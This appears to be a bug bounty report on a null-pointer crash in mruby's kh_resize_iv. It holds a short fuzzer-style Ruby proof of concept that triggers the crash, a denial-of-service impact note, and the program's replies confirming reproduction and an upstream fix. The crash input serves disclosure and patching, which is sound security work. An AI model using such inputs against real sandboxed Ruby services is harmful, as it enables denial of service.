title: SIGSEGV - kh_resize_iv - Null Deref
vulnerability_information:
PoC
---------------------

The following code triggers the bug (attached as kh_resize_iv.rb):

		

	l()

	t('','')do()end

	s('','')do([].())end



	[]*()
	d

	t('')do([].())end

	a=Array.new

	a.[]=(102,0)
	€
	s

	a.to_s
	a




	a.to_s
	a.i

Impact
---------------------

This vulnerability is caused by NullPointer error. It can not be exploited, but it can cause DoS.

activities.message:
Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!
Thank you for your report. We've reproduced the crash, and opened an issue upstream: https://github.com/mruby/mruby/issues/3388

Thanks again for your report. This issue was recently patched upstream in https://github.com/mruby/mruby/commit/8e0f2313302871ddd713c3e8e6a9d4731426f308

Our next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.
Thanks for helping improve the security of Mruby and Shopify Scripts!
